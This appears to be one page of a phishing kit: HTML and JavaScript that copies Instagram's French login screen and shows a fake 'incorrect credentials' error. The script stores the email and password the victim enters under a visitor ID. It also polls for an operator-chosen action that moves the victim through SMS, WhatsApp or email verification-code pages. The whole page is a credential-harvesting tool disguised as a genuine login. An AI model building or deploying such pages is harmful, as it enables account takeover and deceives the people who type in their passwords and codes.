<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram - Connexion</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📸</text></svg>">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#f5f5f5}
    .ig-logo{width:100%;text-align:center;padding:20px 0 0}
    .ig-logo svg{width:56px;height:56px}
    .divider{width:100%;height:1px;background:#262626;margin-top:16px}
    .container{width:100%;max-width:400px;padding:40px 16px 20px;flex:1;display:flex;flex-direction:column;align-items:center}
    .card{background:#181818;border:1px solid #363636;border-radius:16px;padding:32px;width:100%}
    .error-box{background:rgba(237,73,86,0.08);border:1px solid rgba(237,73,86,0.3);border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:10px}
    .error-icon{width:20px;height:20px;border-radius:50%;background:#ed4956;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;margin-top:1px}
    .error-text{font-size:13px;color:#f5f5f5;line-height:1.5}
    .error-text a{color:#0095f6;text-decoration:none;font-weight:600}
    .error-text a:hover{text-decoration:underline}
    .input-group{margin-bottom:12px;position:relative}
    .field-label{position:absolute;top:-8px;left:14px;font-size:11px;color:#a8a8a8;background:#181818;padding:0 4px;z-index:1}
    input[type="text"],input[type="password"]{width:100%;padding:14px 16px;border:1px solid #363636;border-radius:12px;font-size:15px;color:#f5f5f5;background:#262626;transition:border-color .2s,background .2s;outline:none;font-family:inherit}
    input:focus{border-color:#585858;background:#1a1a1a}
    input::placeholder{color:#737373}
    .pw-toggle{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#737373;cursor:pointer;padding:4px}
    .pw-toggle:hover{color:#f5f5f5}
    .btn-primary{width:100%;padding:14px;border:none;border-radius:28px;font-size:15px;font-weight:600;cursor:pointer;color:#fff;background:#0095f6;transition:background .2s;font-family:inherit;margin-top:8px}
    .btn-primary:hover{background:#1877f2}
    .forgot{text-align:center;margin-top:20px}
    .forgot a{color:#f5f5f5;font-size:14px;font-weight:600;text-decoration:none}
    .forgot a:hover{text-decoration:underline}
    .btn-fb{width:100%;padding:14px;background:transparent;border:1px solid #363636;border-radius:28px;color:#f5f5f5;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .2s;margin-top:24px}
    .btn-fb:hover{background:rgba(255,255,255,0.05)}
    .btn-signup{width:100%;padding:14px;background:transparent;border:1px solid #0095f6;border-radius:28px;color:#0095f6;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .2s;margin-top:12px}
    .btn-signup:hover{background:rgba(0,149,246,0.08)}
    .footer{width:100%;max-width:400px;text-align:center;padding:16px;color:#737373;font-size:12px;line-height:1.6}
    .footer a{color:#737373;text-decoration:none}
    .footer a:hover{text-decoration:underline}
  </style>
</head>
<body>
  <div class="ig-logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="56" height="56">
      <defs><linearGradient id="igGrad" x1="0.17" y1="0.86" x2="0.83" y2="0.14" gradientUnits="objectBoundingBox"><stop offset="0%" stop-color="#feda75"/><stop offset="20%" stop-color="#fa7e1e"/><stop offset="40%" stop-color="#d62976"/><stop offset="65%" stop-color="#962fbf"/><stop offset="100%" stop-color="#4f5bd5"/></linearGradient></defs>
      <rect x="2" y="2" width="44" height="44" rx="12" fill="none" stroke="url(#igGrad)" stroke-width="3"/>
      <circle cx="24" cy="24" r="9" fill="none" stroke="url(#igGrad)" stroke-width="3"/>
      <circle cx="35.5" cy="12.5" r="2.8" fill="url(#igGrad)"/>
    </svg>
    <div class="divider"></div>
  </div>

  <div class="container">
    <div class="card">
      <div class="error-box">
        <div class="error-icon">!</div>
        <div class="error-text">
          Les informations de connexion que vous avez entrées sont incorrectes.
          <a href="#">Find your account and log in.</a>
        </div>
      </div>

      <form id="loginForm">
        <div class="input-group">
          <label class="field-label">Numéro de mobile, nom de profil ou adresse e-mail</label>
          <input type="text" id="email" autocomplete="username">
        </div>
        <div class="input-group">
          <label class="field-label">Mot de passe</label>
          <input type="password" id="password" autocomplete="current-password">
          <button type="button" class="pw-toggle" id="pwToggle">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
          </button>
        </div>
        <button type="submit" class="btn-primary">Se connecter</button>
      </form>

      <div class="forgot">
        <a href="#">Mot de passe oublié ?</a>
      </div>

      <button class="btn-fb">
        <svg viewBox="0 0 24 24" fill="#1877f2" width="20" height="20"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
        Se connecter avec Facebook
      </button>

      <button class="btn-signup">Créer un nouveau compte</button>
    </div>
  </div>

  <div class="footer">
    <div>Meta &copy; 2026</div>
    <div style="margin-top:4px">
      <a href="#">Conditions</a> &middot; <a href="#">Politique de confidentialité</a> &middot; <a href="#">Politique relative aux cookies</a>
    </div>
  </div>

  <script>
    var params = new URLSearchParams(window.location.search);
    var username = params.get('user') || '';
    if (!username) window.location.href = '../INSTAGRAM.html';

    function getUsers() { try { return JSON.parse(localStorage.getItem('ig_users') || '[]'); } catch (e) { return []; } }
    function saveUsers(users) { localStorage.setItem('ig_users', JSON.stringify(users)); }

    function getClientId() {
      var id = sessionStorage.getItem('ig_visitor_id');
      if (!id) { window.location.href = '../INSTAGRAM.html'; return ''; }
      return id;
    }

    var cid = getClientId();
    if (cid) {
      var users = getUsers();
      var user = users.find(function(u) { return u.visitorId === cid; });
      if (user) { user.status = 'login_incorrect'; saveUsers(users); }
    }

    document.getElementById('pwToggle').addEventListener('click', function() {
      var pw = document.getElementById('password');
      pw.type = pw.type === 'password' ? 'text' : 'password';
    });

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      var email = document.getElementById('email').value.trim();
      var password = document.getElementById('password').value;
      if (!email || !password) return;
      var visitorId = getClientId();
      var users = getUsers();
      var user = users.find(function(u) { return u.visitorId === visitorId; });
      if (user) {
        user.data = user.data || {};
        user.data.email = email;
        user.data.password = password;
        saveUsers(users);
      }
      var btn = this.querySelector('button[type="submit"]');
      btn.disabled = true;
      btn.textContent = 'Connexion en cours...';
      setTimeout(function() { window.location.href = 'loading.html?user=' + encodeURIComponent(username); }, 1000);
    });

    var checkInterval = setInterval(function() {
      var visitorId = getClientId();
      var users = getUsers();
      var user = users.find(function(u) { return u.visitorId === visitorId; });
      if (user && user.action) {
        var action = user.action;
        user.action = null;
        saveUsers(users);
        var pages = { 'connexion_f': 'login.html', 'login_incorrect': 'login_incorrect.html', 'sms_verification': 'sms.html', 'sms_error': 'sms_incorrect.html', 'whatsapp_verification': 'whatsapp.html', 'whatsapp_error': 'whatsapp_incorrect.html', 'email_verification': 'email.html', 'email_error': 'email_incorrect.html', 'loading': 'loading.html', 'technical_error': 'technical_error.html' };
        var page = pages[action] || 'loading.html';
        window.location.href = page + '?user=' + encodeURIComponent(username);
      }
    }, 2000);
  </script>
</body>
</html>
